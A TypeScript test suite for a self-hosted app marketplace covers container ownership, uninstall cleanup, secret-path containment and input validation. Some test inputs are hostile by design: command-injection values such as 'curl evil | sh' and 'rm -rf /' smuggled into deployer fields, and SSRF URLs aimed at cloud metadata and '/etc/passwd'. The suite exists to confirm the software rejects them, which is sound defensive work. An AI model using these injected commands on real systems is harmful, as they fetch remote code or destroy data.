/**
 * Plan 4 stage C: installed-app records, ownership tags and the Market security fixes.
 */
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, stat, writeFile, chmod, readdir } from 'node:fs/promises';
import { readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';
import vm from 'node:vm';
import { createRequire } from 'node:module';
import ts from 'typescript';
import { appSecretNameFromFile, appSecretStoreAt, appSecretFile } from '../src/lib/infrastructure/secrets';
import { assertContainerNamesAvailable } from '../src/lib/market/instance-ownership';
import { getContainerName, leftoverAppPaths } from '../src/lib/market/engine-helpers';
import { caddyTrustAppDirectory, removeCaddyTrustBundle } from '../src/lib/market/caddy-ca';
import { catalogIconPath, resolveAppIcon } from '../src/lib/market/app-icon';
import type { InstallMetadata } from '../src/lib/market/types';

const require = createRequire(import.meta.url);
const root = process.env.CONTROL_PANEL_ROOT || path.join(import.meta.dirname, '..');
const INSTALLATION = '20000000-0000-4000-8000-000000000001';
const FOREIGN = '20000000-0000-4000-8000-000000000002';

/** Load a source module in a sandbox with every import mocked (unmocked imports throw on use). */
function loadModule(file: string, mocks: Record<string, unknown>, globals: Record<string, unknown> = {}) {
  const exports: Record<string, any> = {};
  const module = { exports };
  vm.runInNewContext(ts.transpileModule(readFileSync(path.join(root, 'src', file), 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true },
  }).outputText, { exports, module, console, URL, Buffer, setTimeout, ...globals, require(name: string) {
    if (name in mocks) return mocks[name];
    if (name.startsWith('node:') || ['path', 'crypto'].includes(name)) return require(name);
    return new Proxy({}, { get: (_target, property) => {
      if (property === '__esModule') return true;
      return () => { throw Error(`Unexpected effect: ${name}.${String(property)}`); };
    } });
  } });
  return module.exports;
}

/** A fake Incus holding `instances` (name → config); records every mutating request. */
function fakeIncus(instances: Record<string, Record<string, string>>) {
  const effects: Array<{ method: string; route: string }> = [];
  const incusRequest = async (method: string, route: string) => {
    const name = decodeURIComponent(route.split('/')[3] ?? '');
    if (method === 'GET') {
      if (!(name in instances)) return { type: 'error', error_code: 404, error: 'not found' };
      return { type: 'sync', status_code: 200, metadata: { name, status: 'Running', config: instances[name] } };
    }
    effects.push({ method, route });
    if (method === 'DELETE') delete instances[name];
    return { type: 'sync' };
  };
  return { effects, incusRequest };
}

function ownershipModule(incusRequest: unknown) {
  return loadModule('lib/market/instance-ownership.ts', { '../incus/server': { incusRequest } });
}

const tags = (appId: string, installationId: string) => ({
  'user.youeye.app_id': appId, 'user.youeye.installation_id': installationId,
});

// ─── Ownership tags ─────────────────────────────────────────

test('a foreign same-name container is refused by the OCI deployer and never deleted', async () => {
  for (const config of [{}, tags('mealie', FOREIGN)]) {
    const incus = fakeIncus({ 'app-mealie': config });
    const deployer = loadModule('lib/infrastructure/oci-deployer.ts', {
      '../incus/server': { incusRequest: incus.incusRequest },
      '../incus/static-ips': { applyStaticIP: async () => {} },
      '../market/instance-ownership': ownershipModule(incus.incusRequest),
    });
    const manifest = { name: 'mealie', displayName: 'app-mealie', containerName: 'app-mealie', image: 'ghcr.io/x/y@sha256:' + 'a'.repeat(64),
      ports: [], environment: {}, volumes: [] };
    await assert.rejects(deployer.deployOCIContainer(manifest, '', undefined,
      { owner: { appId: 'mealie', installationId: INSTALLATION } }), /already exists; refusing to replace it/);
    assert.deepEqual(incus.effects, []);
  }
});

test('the OCI deployer never replaces a non-platform instance even without an owner', async () => {
  const incus = fakeIncus({ 'app-other': {} });
  const deployer = loadModule('lib/infrastructure/oci-deployer.ts', {
    '../incus/server': { incusRequest: incus.incusRequest },
    '../incus/static-ips': { applyStaticIP: async () => {} },
    '../market/instance-ownership': ownershipModule(incus.incusRequest),
  });
  await assert.rejects(deployer.deployOCIContainer({ name: 'x', displayName: 'x', containerName: 'app-other', image: 'x/y',
    ports: [], environment: {}, volumes: [] }, ''), /refusing to replace it/);
  assert.deepEqual(incus.effects, []);
});

test('preflight refuses any target name Incus already holds', async () => {
  const incus = fakeIncus({ 'app-mealie': tags('mealie', FOREIGN) });
  const ownership = ownershipModule(incus.incusRequest);
  await assert.rejects(ownership.assertInstancesAbsent(['app-mealie']), /already exists and does not belong to this install/);
  await ownership.assertInstancesAbsent(['app-other']);
  assert.deepEqual(incus.effects, []);
});

test('cleanup deletes only an exact name tagged with this installation', async () => {
  const incus = fakeIncus({
    'app-foo': tags('foo', INSTALLATION),
    'app-foo-bar': tags('foo-bar', FOREIGN),
    'app-untagged': {},
  });
  const ownership = ownershipModule(incus.incusRequest);
  const owner = { appId: 'foo', installationId: INSTALLATION };
  await assert.rejects(ownership.deleteOwnedInstance('app-foo-bar', owner), /not tagged with this installation/);
  await assert.rejects(ownership.deleteOwnedInstance('app-untagged', owner), /not tagged with this installation/);
  await assert.rejects(ownership.deleteOwnedInstance('app-foo', undefined), /not tagged with this installation/);
  assert.deepEqual(incus.effects, []);
  assert.equal(await ownership.deleteOwnedInstance('app-foo', owner), 'deleted');
  assert.equal(await ownership.deleteOwnedInstance('app-foo', owner), 'absent');
  assert.deepEqual(incus.effects.map((effect) => effect.route), ['/1.0/instances/app-foo/state', '/1.0/instances/app-foo']);
});

test('a stopped (never started) owned instance is still deleted', async () => {
  const incus = fakeIncus({ 'app-foo': tags('foo', INSTALLATION) });
  const request = async (method: string, route: string) => method === 'PUT'
    ? { type: 'error', error: 'The instance is already stopped' }
    : incus.incusRequest(method, route);
  const ownership = ownershipModule(request);
  assert.equal(await ownership.deleteOwnedInstance('app-foo', { appId: 'foo', installationId: INSTALLATION }), 'deleted');
});

// ─── Container names ────────────────────────────────────────

const record = (appId: string, containers: string[]): InstallMetadata => ({
  appId, integration: 'basic', subdomain: appId, domain: 'example.test', enableSSO: false,
  installedAt: '2026-11-12T00:00:00Z',
  containers: containers.map((containerName) => ({ name: 'main', containerName, type: 'oci' as const })),
});

test('colliding container names are refused in either install order', () => {
  // app `foo` with sidecar `bar` and app `foo-bar` both want `app-foo-bar`.
  const fooNames = ['main', 'bar'].map((name) => getContainerName('foo', name, 2));
  assert.deepEqual(fooNames, ['app-foo-main', 'app-foo-bar']);
  assert.throws(() => assertContainerNamesAvailable('foo', fooNames, [record('foo-bar', ['app-foo-bar'])]),
    /already used by installed app foo-bar/);
  assert.throws(() => assertContainerNamesAvailable('foo-bar', [getContainerName('foo-bar', 'main', 1)],
    [record('foo', fooNames)]), /already used by installed app foo/);
  // A retained (keep-data) app's names are reserved as well; the app's own record is not a collision.
  const retained = { ...record('foo-bar', []), retainedRoots: { schemaVersion: 1 as const, state: 'ready' as const,
    roots: [{ sourceName: 'app-foo-bar', retainedName: 'ye-retained-1', ownerId: INSTALLATION, pool: 'default' }] } };
  assert.throws(() => assertContainerNamesAvailable('foo', fooNames, [retained]), /foo-bar/);
  assertContainerNamesAvailable('foo', fooNames, [record('foo', fooNames), record('other', ['app-other'])]);
  assert.throws(() => assertContainerNamesAvailable('foo', ['app-foo', 'app-foo'], []), /used twice/);
  assert.throws(() => assertContainerNamesAvailable('x', [`app-${'a'.repeat(32)}-${'b'.repeat(30)}`], []), /1–63 chars/);
});

// ─── Uninstall: siblings, CA directory, cleanup_pending ─────

function uninstallFixture(options: { failStorage?: boolean; sharedDatabaseCreated?: boolean } = {}) {
  const incus = fakeIncus({
    'app-foo': tags('foo', INSTALLATION),
    'app-foo-bar': tags('foo-bar', FOREIGN),
  });
  let metadata: any = {
    ...record('foo', ['app-foo']), installationId: INSTALLATION, databaseMode: 'shared',
    databaseName: 'foo', databaseUser: 'foo', storageVolumes: [],
    ...(options.sharedDatabaseCreated === false ? {} : { sharedDatabaseCreated: true }),
  };
  const saved: any[] = [];
  const removedRoutes: string[] = [];
  const calls: string[] = [];
  let lease: unknown = { bridgeName: 'yeapp1', state: 'active' };
  const routes = [
    { id: 'route-1', hostname: 'foo.example.test', upstream: '10.0.0.2' },
    { id: 'app-foo-bar-web', hostname: 'foo-bar.example.test', upstream: 'app-foo-bar' },
  ];
  const sql: string[][] = [];
  const uninstaller = loadModule('lib/market/uninstaller.ts', {
    '../incus/server': { execCommand: async (_container: string, args: string[]) => { sql.push(args); return { exitCode: 0, stdout: '' }; } },
    '../infrastructure/oci-deployer': { containerExists: async (name: string) => name === 'app-foo-bar' },
    '../caddy/client': {
      getRoutes: async () => routes.filter((route) => !removedRoutes.includes(route.id)),
      removeRoute: async (id: string) => { removedRoutes.push(id); },
    },
    './metadata': {
      readInstallMetadata: async () => metadata,
      saveInstallMetadata: async (value: unknown) => { saved.push(structuredClone(value)); },
      removeInstallMetadata: async () => { calls.push('remove-metadata'); metadata = null; },
      removeInstallMetadataRecord: async () => { metadata = null; },
    },
    './installed-apps': { removeInstalledApp: async () => {}, getInstalledApp: async () => null },
    '@/lib/identity/provider': { removeForwardAuth: async () => {}, removeOAuthClient: async () => {} },
    './reconciler': { isAppRegisteredWithUI: async () => false, cleanupAppByScan: async () => ({ repaired: [], unresolved: [] }) },
    '../incus/app-network': {
      withAppNetworkOperationLock: async (_id: string, _op: string, fn: () => unknown) => fn(),
      removeSystemProxyDevices: async () => {}, removeCaddyFromAppNetwork: async () => {},
      deleteAppNetwork: async () => { lease = null; }, getAppNetworkLease: async () => lease,
      markAppNetworkCleanupPending: async () => { calls.push('lease-cleanup-pending'); },
    },
    '@/lib/pointer/managed-apps': {},
    '@/lib/infrastructure/secrets': {
      deleteAllAppSecrets: async (appId: string) => { calls.push(`secrets:${appId}`); },
      readAppSecret: async () => null,
    },
    './caddy-ca': { removeCaddyTrustBundle: async (appId: string) => { calls.push(`ca:${appId}`); } },
    './instance-ownership': ownershipModule(incus.incusRequest),
    './restored-managed-ai': {},
    './storage': {
      deleteAppStorage: async () => { if (options.failStorage) throw Error('volume busy'); calls.push('storage'); },
      verifyAppStorageRemoval: async () => !options.failStorage,
    },
    './update-admission': { withAppInventory: async (fn: () => unknown) => fn(),
      withAppLifecycle: async (_id: string, fn: () => unknown) => fn() },
    '../apps/service-credential-bridge': { revokeAppCredential: async () => {} },
    '../apps/service-credential-probe': { quiesceAppCredentialRuntime: async () => {} },
    '@/lib/admission/lifecycle': { verifyAdmissionCleanup: async () => {}, retainAdmissionOnUninstall: async () => {} },
    '../bridges/manager': { getBridgesForApp: async () => [] },
    '../apps/pihole-api': { getCNAMERecords: async () => [], getDNSRecords: async () => [] },
    '../incus/container-ip': { getContainerIP: async () => '192.0.2.1' },
    '@/lib/identity/store': { getClient: async () => null },
    fs: { readFileSync: () => { throw Error('No fixture token file'); } },
  }, { process: { env: { UI_BRIDGE_TOKEN: 'fixture-only' } }, fetch: async () => ({ ok: true, status: 200 }) });
  return { uninstaller, incus, calls, saved, sql, removedRoutes, metadata: () => metadata };
}

test('uninstalling foo never touches foo-bar and removes its database, secrets and CA directory', async () => {
  const f = uninstallFixture();
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.deepEqual(f.incus.effects.map((effect) => effect.route), ['/1.0/instances/app-foo/state', '/1.0/instances/app-foo']);
  assert.deepEqual(f.removedRoutes, ['route-1']);
  assert.ok(f.calls.includes('ca:foo'));
  assert.ok(f.calls.includes('secrets:foo'));
  assert.ok(f.calls.includes('remove-metadata'));
  assert.ok(f.sql.some((args) => args.includes('DROP DATABASE IF EXISTS "foo"')));
  assert.ok(f.sql.some((args) => args.includes('DROP ROLE IF EXISTS "foo"')));
  assert.equal(f.metadata(), null);
});

test('delete-data never drops a shared database this installation did not create', async () => {
  const f = uninstallFixture({ sharedDatabaseCreated: false });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.ok(f.calls.includes('secrets:foo'));
  assert.ok(!f.sql.some((args) => args.some((arg) => /DROP (DATABASE|ROLE)/.test(arg))), 'no DROP statement ran');
  assert.equal(f.metadata(), null);
});

test('the install record marks the shared database as created only after creation succeeded', () => {
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  const create = engine.indexOf('await setupSharedPostgres(dbName, dbUser, dbPassword, rollbackCtx);');
  const mark = engine.indexOf('created.sharedDatabaseCreated = true;');
  assert.ok(create > 0 && mark > create, 'the flag is written after setupSharedPostgres returns');
  assert.match(engine, /sharedDatabaseCreated: manifest\.database\?\.mode === 'shared' && restoreOptions\?\.sharedDatabaseCreated \? true : undefined/);
  const reconciler = readFileSync(path.join(root, 'src/lib/market/reconciler.ts'), 'utf8');
  assert.match(reconciler, /databaseMode === 'shared' && recoveryMetadata\.sharedDatabaseCreated === true/);
});

test('a failed deletion keeps install.json with cleanupPending for the next retry', async () => {
  const f = uninstallFixture({ failStorage: true });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, false);
  assert.ok(f.metadata(), 'install.json stays as the recovery map');
  assert.equal(f.saved.at(-1).cleanupPending, true);
  assert.ok(f.calls.includes('lease-cleanup-pending'));
  assert.ok(!f.calls.includes('remove-metadata'));
});

test('the generated CA directory is removed so a reinstall passes preflight', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-ca-'));
  try {
    const trust = path.join(caddyTrustAppDirectory('mealie', base), 'trust');
    await mkdir(trust, { recursive: true });
    await writeFile(path.join(trust, 'ca-bundle.crt'), 'bundle');
    assert.deepEqual(leftoverAppPaths('mealie', base), [path.join(base, 'apps', 'mealie')]);
    await removeCaddyTrustBundle('mealie', base);
    assert.deepEqual(leftoverAppPaths('mealie', base), []);
    await removeCaddyTrustBundle('mealie', base); // absent is clean
    assert.throws(() => caddyTrustAppDirectory('../etc'), /Invalid app ID/);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

// ─── Secrets ────────────────────────────────────────────────

test('secret names and paths cannot escape the app secret directory', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-secrets-'));
  try {
    const store = appSecretStoreAt(base);
    for (const name of ['../escape', '..', 'install.json', 'a/b', '.db_password', 'UPPER', '', 'x'.repeat(41)]) {
      await assert.rejects(store.write('mealie', name, 'value'), /Invalid app secret name/);
      await assert.rejects(store.read('mealie', name), /Invalid app secret name/);
    }
    await assert.rejects(store.write('../etc', 'db_password', 'value'), /Invalid app ID/);
    assert.equal(store.path('mealie', 'db_password'), path.join(base, 'app-mealie', 'secrets', 'db_password'));
    assert.equal(appSecretFile('db_password'), 'secrets/db_password');
    assert.equal(appSecretNameFromFile('secrets/db_password'), 'db_password');
    for (const file of ['secrets/../install.json', 'install.json', '.db_password', 'secrets/a/b']) {
      assert.throws(() => appSecretNameFromFile(file), /outside the app-owned secret directory/);
    }
    // install.json next to the secrets directory is never readable as a secret.
    await mkdir(path.join(base, 'app-mealie'), { recursive: true });
    await writeFile(path.join(base, 'app-mealie', 'install.json'), '{}');
    assert.equal(await store.read('mealie', 'install'), null);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

test('the app secret directory is 0700 and secret files are 0600', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-secrets-'));
  try {
    const store = appSecretStoreAt(base);
    // A legacy world-writable directory is tightened on the next write.
    await mkdir(path.join(base, 'app-mealie', 'secrets'), { recursive: true });
    await chmod(path.join(base, 'app-mealie', 'secrets'), 0o777);
    await store.write('mealie', 'db_password', 'first');
    assert.equal((await stat(path.join(base, 'app-mealie', 'secrets'))).mode & 0o777, 0o700);
    assert.equal((await stat(store.path('mealie', 'db_password'))).mode & 0o777, 0o600);
    assert.equal(await store.getOrCreate('mealie', 'db_password', () => 'second'), 'first');
    assert.equal(await store.getOrCreate('mealie', 'api_key', () => 'generated'), 'generated');
    assert.equal((await stat(store.path('mealie', 'api_key'))).mode & 0o777, 0o600);
    assert.deepEqual((await readdir(path.join(base, 'app-mealie', 'secrets'))).sort(), ['api_key', 'db_password']);
    await store.removeAll('mealie');
    assert.equal(await store.read('mealie', 'db_password'), null);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

test('the platform secret writer never creates world-writable directories', () => {
  const source = readFileSync(path.join(root, 'src/lib/infrastructure/secrets.ts'), 'utf8');
  assert.doesNotMatch(source, /chmod\([^)]*0o777|mode: 0o777/);
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  assert.doesNotMatch(engine, /\/var\/lib\/youeye\/secrets\//);
});

// ─── Native deployer boundary ───────────────────────────────

test('a bad Node version or app directory is refused at the native deployer before Incus', async () => {
  const incus = fakeIncus({});
  const deployer = loadModule('lib/infrastructure/lxd-deployer.ts', {
    '../incus/server': { incusRequest: incus.incusRequest },
    '../incus/static-ips': { applyStaticIP: async () => {} },
    './oci-deployer': { containerExists: async () => false },
    '@/lib/market/instance-ownership': ownershipModule(incus.incusRequest),
  });
  const spec = { name: 'notes', displayName: 'Notes', containerName: 'app-notes', image: 'debian/13',
    imageServer: 'https://images.linuxcontainers.org', imageProtocol: 'simplestreams',
    nodeVersion: '22.x', appDir: '/opt/app', port: 3000 };
  deployer.assertMarketNativeSpec(spec);
  const bad = [
    { nodeVersion: '22.x; curl evil | sh' }, { nodeVersion: '18.x' }, { nodeVersion: '22' },
    { appDir: '/opt/app; rm -rf /' }, { appDir: 'app' }, { appDir: '/srv/app' },
    { postInstallCommands: ['id'] }, { entryFile: '../x.js' }, { runtime: 'bun' },
    { displayName: 'Notes\nExecStartPre=/bin/sh' }, { containerName: 'app_notes' },
  ];
  for (const change of bad) {
    assert.throws(() => deployer.assertMarketNativeSpec({ ...spec, ...change }));
    await assert.rejects(deployer.deployMarketLXDContainer({ ...spec, ...change }, {}, {}, undefined,
      { appId: 'notes', installationId: INSTALLATION }));
  }
  assert.deepEqual(incus.effects, []);
});

// ─── Icons ──────────────────────────────────────────────────

test('app icons come only from the app folder in the official catalog, never a URL', async () => {
  const reads: string[] = [];
  const read = async (file: string) => { reads.push(file); return Buffer.from('<svg/>'); };
  const base = { appId: 'mealie', lucide: 'utensils', manifestPath: 'apps/mealie/youeye-app.yaml' };
  for (const iconUrl of [
    'https://169.254.169.254/latest/meta-data',
    'http://youeye-postgres.youeye:5432/x.png',
    '/api/market/image?url=https%3A%2F%2Fraw.githubusercontent.com%2Fx%2Fy%2Fmain%2Ficon.png',
    '/api/market/image?catalog=apps%2Fnotes%2Ficon.svg',
    '/api/market/image?catalog=apps%2Fmealie%2F..%2Fnotes%2Ficon.svg',
    '/api/market/image?catalog=apps%2Fmealie%2Fyoueye-app.yaml',
  ]) {
    assert.equal(await resolveAppIcon({ ...base, iconUrl }, read), 'utensils', iconUrl);
  }
  for (const customIcon of ['https://example.com/x.png', 'http://10.0.0.1/', 'file:///etc/passwd']) {
    assert.equal(await resolveAppIcon({ ...base, customIcon }, read), 'utensils');
  }
  assert.deepEqual(reads, []);
  assert.equal(catalogIconPath({ iconUrl: '/api/market/image?catalog=apps%2Fmealie%2Ficon.svg', manifestPath: undefined }), null);
  assert.equal(await resolveAppIcon({ ...base, iconUrl: '/api/market/image?catalog=apps%2Fmealie%2Ficon.svg' }, read),
    `data:image/svg+xml;base64,${Buffer.from('<svg/>').toString('base64')}`);
  assert.deepEqual(reads, ['apps/mealie/icon.svg']);
  assert.equal(await resolveAppIcon({ ...base, customIcon: 'book' }, read), 'book');
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  assert.doesNotMatch(engine, /fetchIconAsDataUri|https\.request/);
});

// ─── Setup files need an explicit approval for URL installs ──

function routeModule(file: string, setups: Array<{ name: string; for: string }>) {
  const started: string[] = [];
  const manifest = { metadata: { id: 'demo', name: 'Demo', defaultSubdomain: 'demo' }, version: '1.0.0', setups,
    containers: [], secrets: [], capabilities: {} };
  const json = (body: unknown, init?: ResponseInit) => Response.json(body, init);
  const loaded = loadModule(file, {
    'next/server': { NextResponse: { json } },
    '@/lib/market/engine': { installApp: async () => { started.push('install'); } },
    '@/lib/market/url-app': {
      fetchUrlApp: async () => manifest, validateAppUrl: () => null, isPrivateHostname: () => false,
      UrlAppError: class extends Error { details: string[] = []; },
    },
    '@/lib/market/install-tracker': { startTracking: () => { started.push('tracking'); return new AbortController(); },
      trackEvent: () => {}, finishTracking: () => {}, logOperationFailure: () => {},
      sanitiseInstallEvent: (event: unknown) => event, sensitivitySafeInstallError: () => 'failed' },
    '@/lib/market/update-admission': { withUserOperationLockWait: (work: () => unknown) => Promise.resolve().then(work) },
    '@/lib/market/installed-apps': { updateInstalledAppSource: async () => {} },
    '@/lib/health/notification-bridge': { sendNotificationToUI: async () => {} },
    '@/lib/settings': { settingsService: { getRaw: async () => ({ domain: 'example.test' }) } },
    '@/lib/auth/rbac': { requireAdmin: async () => ({ session: { username: 'owner' } }) },
    '@/lib/auth/session': { verifyCSRFToken: async () => true },
    '@/lib/admission/management': { admissionAdministrator: async () => INSTALLATION },
    '@/lib/market/direct-apps': { saveDirectMarketApp: async () => { started.push('saved'); return {}; } },
  }, { Response, TextEncoder, ReadableStream });
  return { loaded, started };
}

const post = (body: unknown) => new Request('https://cp.example.test/api', { method: 'POST', body: JSON.stringify(body) });

test('install-url refuses an app with setup files unless allowSetup is sent', async () => {
  const setups = [{ name: 'setup/sso.yaml', for: 'sso' }];
  const { loaded, started } = routeModule('app/api/market/install-url/route.ts', setups);
  const refused = await loaded.POST(post({ url: 'https://example.com/youeye-app.yaml', acceptUnverifiedPublisher: true }));
  assert.equal(refused.status, 400);
  const body = await refused.json();
  assert.match(body.error, /allowSetup/);
  assert.deepEqual(body.setups, setups);
  assert.deepEqual(started, []);

  const plain = routeModule('app/api/market/install-url/route.ts', []);
  const accepted = await plain.loaded.POST(post({ url: 'https://example.com/youeye-app.yaml', acceptUnverifiedPublisher: true }));
  assert.equal(accepted.status, 200);
  await accepted.text();
  assert.deepEqual(plain.started.slice(0, 3), ['saved', 'tracking', 'install']);
});

test('validate-url refuses to add an app with setup files unless allowSetup is sent', async () => {
  const setups = [{ name: 'setup/install.yaml', for: 'install' }];
  const { loaded, started } = routeModule('app/api/market/validate-url/route.ts', setups);
  const refused = await loaded.POST(post({ manifestUrl: 'https://example.com/youeye-app.yaml', addToMarket: true }));
  assert.equal(refused.status, 400);
  const body = await refused.json();
  assert.equal(body.setupApprovalRequired, true);
  assert.deepEqual(body.setups, setups);
  assert.deepEqual(started, []);
});

// ─── Frozen copies and internet ─────────────────────────────

test('paths acting on installed apps read the frozen copy, not the live catalog', () => {
  for (const file of [
    'src/lib/market/managed-ai.ts', 'src/lib/bridges/manager.ts', 'src/lib/bridges/suggestions.ts',
    'src/app/api/market/uninstall/route.ts', 'src/app/api/market/providers/route.ts', 'src/lib/market/ui-manifest-sync.ts',
    'src/app/api/suggestions/regenerate/route.ts', 'src/app/api/bridges/resolve/route.ts', 'src/lib/backup/app-restore.ts',
  ]) {
    assert.doesNotMatch(readFileSync(path.join(root, file), 'utf8'), /fetchManifest(FromSource)?\(/, file);
  }
  const ui = readFileSync(path.join(root, '../ui/src/app/api/v1/apps/register/route.ts'), 'utf8');
  assert.match(ui, /frozenCpManifest \?\? liveManifest/);
  const uiQueries = readFileSync(path.join(root, '../ui/src/lib/db/queries/app-management.ts'), 'utf8');
  assert.match(uiQueries, /existing\?\.manifest\?\.frozen && !manifest\.frozen/);
  assert.match(uiQueries, /delete manifest\.frozen/);
});

test('internet is an honest NAT boolean: no per-host allowlist remains', () => {
  for (const file of ['src/lib/market/types.ts', 'src/lib/market/engine.ts', 'src/lib/bridges/manager.ts',
    'src/lib/bridges/suggestions.ts', 'src/app/api/market/app/[appId]/connections/route.ts',
    '../ui/src/lib/internet/scopes.ts']) {
    assert.doesNotMatch(readFileSync(path.join(root, file), 'utf8'), /internet(\?)?\.hosts|hosts: string\[\];\n  proxy/, file);
  }
});

// ─── Exact route ownership (no app-<id>- prefixes) ──────────

test('the update ingress fence covers only routes to containers the install record names', async () => {
  const route = (id: string, host: string, dial: string) => ({ '@id': id, match: [{ host: [host] }],
    handle: [{ handler: 'reverse_proxy', upstreams: [{ dial }] }] });
  let config: any = { apps: { http: { servers: { srv0: { routes: [
    route('app-foo-main', 'foo.box.test', 'app-foo:8080'),
    route('route-7', 'alias.box.test', 'app-foo.youeye:8080'),
    route('app-foo-bar-web', 'foo-bar.box.test', 'app-foo-bar:8080'),
  ] } } } } };
  const plan = { metadata: { appId: 'foo', subdomain: 'foo', domain: 'box.test',
    containers: [{ name: 'main', containerName: 'app-foo', type: 'oci' }] } };
  const provider = loadModule('lib/market/update-provider.ts', {
    '@/lib/caddy/client': {
      getConfig: async () => structuredClone(config),
      setConfig: async (next: unknown) => { config = structuredClone(next); },
    },
    './update-workspace': {
      AppUpdateWorkspace: class { get() { return Buffer.from(JSON.stringify(plan)); } },
      updateDigest: () => 'digest',
    },
    './constants': { CONTAINER_DOMAIN: 'youeye' },
  });
  const instance = new provider.IncusAppUpdateProvider();
  (instance as any).load = () => plan;
  await (instance as any).ingress({ id: 'u1', appId: 'foo' }, true);
  const fence = config.apps.http.servers.srv0.routes[0];
  assert.equal(fence['@id'], 'app-update-foo');
  assert.deepEqual(fence.match[0].host.sort(), ['alias.box.test', 'foo.box.test']);
});

test('admission reconciliation does not claim routes by an app-<id>- prefix', () => {
  const lifecycle = readFileSync(path.join(root, 'src/lib/admission/lifecycle.ts'), 'utf8');
  const provider = readFileSync(path.join(root, 'src/lib/market/update-provider.ts'), 'utf8');
  for (const source of [lifecycle, provider]) assert.doesNotMatch(source, /startsWith\(`app-\$\{[^}]+\}-`\)/);
});

// ─── Sign-in setting after install ──────────────────────────

test('the sign-in setting is offered for installed apps with sso and setup/sso.yaml', async () => {
  const apps: Record<string, any> = {
    jellyfin: { meta: { appId: 'jellyfin', enableSSO: true, lifecycleState: 'active' },
      manifest: { sso: { callback_path: '/cb' }, setups: [{ for: 'sso' }] } },
    plain: { meta: { appId: 'plain', enableSSO: false, lifecycleState: 'active' }, manifest: { setups: [] } },
    envsso: { meta: { appId: 'envsso', enableSSO: true, lifecycleState: 'active' }, manifest: { sso: {}, setups: [] } },
  };
  const signIn = loadModule('lib/market/sign-in.ts', {
    './metadata': { readInstallMetadata: async (id: string) => apps[id]?.meta ?? null },
    './frozen-manifest': { readFrozenUpdateManifest: async (id: string) => apps[id].manifest },
    './setup-runner': { setupFor: (manifest: any, purpose: string) => manifest.setups.find((s: any) => s.for === purpose) },
  });
  assert.deepEqual({ ...await signIn.getAppSignIn('jellyfin') }, { appId: 'jellyfin', available: true, enabled: true });
  assert.deepEqual({ ...await signIn.getAppSignIn('plain') }, { appId: 'plain', available: false, enabled: false });
  assert.equal((await signIn.getAppSignIn('envsso')).available, false);
  await assert.rejects(signIn.getAppSignIn('missing'), /not installed/);

  const ui = readFileSync(path.join(root, 'src/components/settings-shell/apps-client.tsx'), 'utf8');
  assert.match(ui, /\/api\/market\/app\/\$\{encodeURIComponent\(appId\)\}\/sign-in`, \{\n\s+method: "PUT"/);
});

test('turning sign-in back on binds the new OAuth client to the app\'s admission policy', async () => {
  const meta: any = { appId: 'immich', subdomain: 'Photos', domain: 'box.test', enableSSO: false, lifecycleState: 'active' };
  const manifest = { metadata: { name: 'Immich' }, containers: [], sso: { callback_path: '/cb', additional_callbacks: [] }, setups: [{ for: 'sso' }] };
  const calls: string[] = [];
  const signIn = loadModule('lib/market/sign-in.ts', {
    '@/lib/admission/store': { ensureAppAdmission: async (input: any) => { calls.push(`admission ${input.clientId} ${input.routes[0].host} ${input.installed}`); } },
    '@/lib/identity/provider': {
      createOAuthClient: async (input: any) => { calls.push(`client ${input.clientId}`); return { clientId: input.clientId, clientSecret: 's' }; },
      removeOAuthClient: async (id: string) => { calls.push(`remove ${id}`); },
    },
    '@/lib/incus/app-network': { addSystemProxyDevices: async () => {}, applyAppEgressAcl: async () => {}, getSystemServices: async () => ({}) },
    './caddy-ca': { injectCaddyRootCA: async () => {} },
    './engine': { pushSsoEntryUrlToUI: async () => {} },
    './metadata': { readInstallMetadata: async () => meta, saveInstallMetadata: async () => { calls.push('saved'); } },
    './frozen-manifest': { readFrozenUpdateManifest: async () => manifest },
    './setup-context': { installedSsoClient: async () => null, installedSetupVariables: async () => ({}), setupContainers: () => ({}) },
    './setup-runner': { setupFor: (m: any, purpose: string) => m.setups.find((s: any) => s.for === purpose), runSetup: async () => { calls.push('setup'); return true; } },
    './update-admission': { withAppLifecycle: async (_id: string, run: () => unknown) => run() },
    './variables': { resolveVariables: (value: string) => value },
  });
  await signIn.setAppSignIn('immich', true);
  assert.deepEqual(calls, ['client youeye-app-immich', 'admission youeye-app-immich photos.box.test true', 'setup', 'saved']);
});
